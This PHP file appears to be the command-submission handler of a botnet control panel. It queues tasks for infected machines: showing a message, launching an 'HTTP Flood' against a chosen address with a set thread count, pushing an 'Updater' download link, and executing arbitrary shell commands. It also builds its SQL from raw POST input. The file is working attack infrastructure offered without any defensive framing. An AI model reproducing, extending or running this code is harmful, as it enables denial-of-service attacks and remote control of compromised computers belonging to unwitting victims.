<?php
error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);
include("inc/config.php");
if (isset($_POST['cmd']) && $_POST['cmd'] != "" && $_POST['cmd'] != null)
{
$target = $_POST['target'];
$target = preg_replace("~[\\/:*?'<>|]~", ' ', $target);
$cmd = $_POST['cmd'];
$cmd = preg_replace("~[\\/:*?'<>|]~", ' ', $cmd);
$arg1 = "null";
$arg2 = "null";
$arg3 = "null";
$arg4 = "null";
if ($cmd == "q") $arg1 = preg_replace("~[\\/:*?'<>|]~", ' ', $_POST['message']); //Show Message
if ($cmd == "a"){ //HTTP Flood
 $arg1 = $_POST['address'];
 $arg2 = preg_replace("~[\\/:*?'<>|]~", ' ', $_POST['threads']);
}
if ($cmd == "b") $arg1 = $_POST['downlink']; //Updater
if ($cmd == "c") $arg1 = $_POST['cmdshell']; //CMD execute
$started = date("Y,m,d H:i:s");
$sql = "INSERT INTO tasks (started, cmd, arg1, arg2, arg3, arg4, target,`status`) VALUES ('$started','$cmd','$arg1','$arg2','$arg3','$arg4','$target','processing')"; 
$result = mysqli_query($conn, $sql) or die("Ошибка " . mysqli_error($conn));
header('Location: '.$url.'index.php');
}
else{
    header('Location: '.$url.'index.php');
}
?>